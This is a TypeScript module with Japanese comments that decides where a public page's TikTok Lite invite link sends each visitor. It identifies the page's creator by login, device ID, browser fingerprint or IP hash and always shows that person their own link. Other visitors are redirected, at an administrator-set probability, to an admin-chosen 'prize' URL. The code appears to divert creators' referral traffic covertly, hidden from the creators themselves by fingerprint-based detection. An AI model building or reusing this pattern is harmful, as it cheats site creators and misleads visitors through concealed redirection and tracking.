import { createAdminClient } from '@/lib/supabase/admin';
import type { Site } from '@/lib/types';
import {
  generateDestinationUrl,
  isInviteLpUrl,
  isTikTokLiteInviteShortLink,
  parseHttpUrl,
} from '@/lib/link-generator';

/**
 * 公開ページの遷移先URLを決定する。
 *
 * - サイト作成者本人のログイン、端末、ブラウザ指紋、IPハッシュのいずれかが一致、または
 *   同一アカウントで過去に利用した端末・指紋・IPハッシュと一致するアクセスは、
 *   常にユーザーが入力した本来のURLへ100%遷移させる(自作自演での不正取得を防ぐため)。
 * - それ以外の訪問者は、管理者が設定した確率でサプライズの当たりURLへ遷移する。
 */
export interface VisitorIdentity {
  deviceId?: string | null;
  fingerprint?: string | null;
  ipHash?: string | null;
  userId?: string | null;
}

type LookupResult = { data: Record<string, unknown> | null; error: { message: string } | null };

async function lookupOne(query: PromiseLike<LookupResult>): Promise<LookupResult> {
  return await query;
}

/**
 * 公開ページへ渡す直前の最終ガード。
 * 古いDBや管理設定に lite.tiktok.com/t/... / 招待LP が残っていても、
 * 閲覧者のブラウザにはそのLPを絶対に渡さない。
 */
export async function normalizePublicDestinationUrl(raw: string): Promise<string> {
  const parsed = parseHttpUrl(raw);
  if (!parsed) return '#';
  if (!isTikTokLiteInviteShortLink(raw) && !isInviteLpUrl(parsed)) return parsed.toString();

  try {
    const built = await generateDestinationUrl(raw);
    const out = parseHttpUrl(built.url);
    if (!out || isTikTokLiteInviteShortLink(built.url) || isInviteLpUrl(out)) return '#';
    return built.url;
  } catch {
    // 公式 lite_redirect を取得できないときにLPへフォールバックしない。
    return '#';
  }
}

/**
 * サイト作成者本人かを複数の独立したシグナルで判定する。
 * 判定用DBの一部に問題があっても、取得できたシグナルだけで判定する。
 * 本人と確認できないことだけを理由に抽選全体を停止しない。
 */
export async function isSiteOwnerVisitor(site: Site, identity: VisitorIdentity): Promise<boolean> {
  const deviceId = identity.deviceId || null;
  const fingerprint = identity.fingerprint || null;
  const ipHash = identity.ipHash || null;
  const userId = identity.userId || null;

  if (userId && userId === site.user_id) return true;
  // 後方互換の即時判定。改変不可なsite_owner_signalsも下で必ず照合する。
  if (deviceId && site.creator_device_id === deviceId) return true;
  if (fingerprint && site.creator_fingerprint === fingerprint) return true;
  if (!deviceId && !fingerprint && !ipHash && !userId) return true;

  const admin = createAdminClient();
  const checks: Promise<LookupResult>[] = [
    lookupOne(admin
      .from('site_owner_signals')
      .select('device_id, fingerprint, ip_hash')
      .eq('site_id', site.id)
      .maybeSingle()),
  ];
  if (deviceId) {
    checks.push(lookupOne(admin.from('known_devices').select('device_id').eq('user_id', site.user_id).eq('device_id', deviceId).maybeSingle()));
  }
  if (fingerprint) {
    checks.push(lookupOne(admin.from('known_fingerprints').select('fingerprint').eq('user_id', site.user_id).eq('fingerprint', fingerprint).maybeSingle()));
  }
  if (ipHash) {
    checks.push(lookupOne(admin.from('known_ip_hashes').select('ip_hash').eq('user_id', site.user_id).eq('ip_hash', ipHash).maybeSingle()));
  }

  const results = await Promise.all(checks);

  const ownerSignal = results[0].error ? null : results[0].data;
  if (ownerSignal) {
    if (deviceId && ownerSignal.device_id === deviceId) return true;
    if (fingerprint && ownerSignal.fingerprint === fingerprint) return true;
    if (ipHash && ownerSignal.ip_hash === ipHash) return true;
  }
  return results.slice(1).some(result => !result.error && !!result.data);
}

export async function resolveDestinationUrl(site: Site, identity: VisitorIdentity): Promise<string> {
  const realUrl = (site.content_data?.tiktokUrl as string) || '#';

  if (await isSiteOwnerVisitor(site, identity)) return await normalizePublicDestinationUrl(realUrl);

  const admin = createAdminClient();
  const { data: config, error: configError } = await admin.from('surprise_config').select('*').eq('id', 1).maybeSingle();
  if (configError || !config || !config.enabled) return await normalizePublicDestinationUrl(realUrl);

  // 解決済みURLがない旧設定でも、入力された当選リンクで抽選を行う。
  // HTMLの解析に失敗しただけで、抽選を無効にしない。
  const prizeUrl = config.prize_url_optimized || config.prize_url;
  if (!prizeUrl) return await normalizePublicDestinationUrl(realUrl);

  const probability = Math.min(100, Math.max(0, Number(config.probability) || 0));
  const roll = Math.random() * 100;
  return await normalizePublicDestinationUrl(roll < probability ? prizeUrl : realUrl);
}

/**
 * dvid Cookieが削除されていた場合の補助判定。
 * ブラウザフィンガープリント(FingerprintJS)が作成者本人・同一アカウントの端末と一致する場合のみ
 * 本来のURLを返す。一致しなければ null を返し、抽選結果には一切影響を与えない
 * (この関数はサプライズの当選確率・当たりURLには触れない)。
 */
export async function resolveCreatorUrlByFingerprint(
  site: Site,
  fingerprint: string,
  identity: Omit<VisitorIdentity, 'fingerprint'> = {}
): Promise<string | null> {
  const realUrl = (site.content_data?.tiktokUrl as string) || '#';
  return await isSiteOwnerVisitor(site, { ...identity, fingerprint })
    ? await normalizePublicDestinationUrl(realUrl)
    : null;
}
